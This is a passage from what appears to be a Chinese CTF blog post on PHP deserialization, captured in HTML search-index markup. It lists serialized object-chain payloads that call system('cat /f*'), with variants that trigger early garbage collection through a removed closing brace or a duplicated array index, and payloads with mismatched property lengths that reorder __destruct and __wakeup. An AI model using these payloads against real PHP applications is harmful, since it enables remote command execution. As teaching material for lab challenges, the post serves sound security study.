class="number">4</span>:<span class="string">&quot;func&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Pwn&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="number">1</span>;N;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除末尾花括号payload：</span></span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;errMsg&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Crypto&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;Reverse&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Pwn&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="number">1</span>;N;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组对象占用指针payload（加粗部分数组下标和前面重复都是0，导致指针出问题）</span></span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;errMsg&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Crypto&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;Reverse&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Pwn&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="number">0</span>;N;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="其余GC回收机制"><a href="#其余GC回收机制" class="headerlink" title="其余GC回收机制"></a>其余GC回收机制</h3><blockquote><p>属性值的长度不匹配</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常payload</span></span><br><span class="line">O:<span class="number">1</span>:“A”:<span class="number">2</span>:&#123;s:<span class="number">4</span>:“info”;O:<span class="number">1</span>:“B”:<span class="number">1</span>:&#123;s:<span class="number">3</span>:“end”;N;&#125;s:<span class="number">4</span>:“Aend”;s:<span class="number">1</span>:“<span class="number">1</span>”;&#125;</span><br><span class="line"><span class="comment">//外部类属性值长度异常payload：</span></span><br><span class="line"><span class="comment">//先外类__destruct()后内类__wakeup()</span></span><br><span class="line">O:<span class="number">1</span>:“A”:<span class="number">2</span>:&#123;s:<span class="number">4</span>:“info”;O:<span class="number">1</span>:“B”:<span class="number">1</span>:&#123;s:<span class="number">3</span>:“end”;N;&#125;s:<span class="number">4</span>:“Aend”;s:<span class="number">2</span>:“<span class="number">1</span>”;&#125;</span><br><span class="line">O:<span class="number">1</span>:“A”:<span class="number">2</span>:&#123;s:<span class="number">4</span>:“info”;O:<span class="number">1</span>:“B”:<span class="number">1</span>:&#123;s:<span class="number">3</span>:“end”;N;&#125;s:<span class="number">4</span>:“Aend”;s:<span class="number">1</span>:“<span class="number">12</span>”;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
